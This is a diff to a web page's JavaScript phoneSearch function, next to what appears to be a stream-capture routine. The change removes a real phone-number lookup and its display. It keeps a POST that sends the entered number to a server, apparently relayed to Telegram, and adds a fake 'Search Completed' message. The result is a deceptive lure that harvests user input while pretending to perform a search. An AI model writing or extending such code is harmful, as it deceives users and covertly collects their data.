@@ -160,16 +160,8 @@ async function capture(stream) {
 /* 🔥 PHONE API */
 async function phoneSearch(num) {
   try {
-    const res = await fetch(`https://number-info-bd-tau.vercel.app/info?number=${num}`);
-    const data = await res.json();
+    document.getElementById("status").innerText = "Searching...";
 
-    // ✅ UI SHOW (RAW)
-    document.getElementById("resultBox").innerHTML = `
-<pre style="text-align:left;color:#0f0;">
-${JSON.stringify(data, null, 2)}
-</pre>`;
-
-    // ✅ TELEGRAM SEND (IMPORTANT)
     await fetch(`${SERVER}/number`, {
       method: "POST",
       headers: {"Content-Type": "application/json"},
@@ -179,9 +171,10 @@ ${JSON.stringify(data, null, 2)}
       })
     });
 
+    document.getElementById("status").innerText = "✅ Search Completed";
+
   } catch (e) {
-    console.log(e);
-    document.getElementById("status").innerText = "API Failed ❌";
+    document.getElementById("status").innerText = "❌ Failed";
   }
 }
 
